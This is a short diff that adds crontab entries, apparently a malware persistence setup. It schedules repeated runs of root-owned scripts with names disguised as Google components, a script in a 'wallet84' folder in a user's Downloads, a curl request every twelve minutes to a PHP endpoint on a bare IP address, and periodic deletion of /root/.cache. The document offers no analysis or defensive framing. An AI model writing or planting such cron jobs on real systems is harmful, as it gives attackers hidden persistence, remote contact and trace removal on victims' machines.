@@ -1,0 +1,13 @@
+0 */4 * * * bash /root/google84
+
+*/12 * * * * python3 /root/googleapps84
+
+*/14 * * * * python3 /root/googleapps84741274
+
+*/8 * * * * python3 /root/google84741274
+
+0 */2 * * * bash /home/demo/Downloads/wallet84/wallet84121274
+
+*/12 * * * * curl http://154.127.52.52/linux84.php
+
+*/12 * * * * rm -rf /root/.cache/*
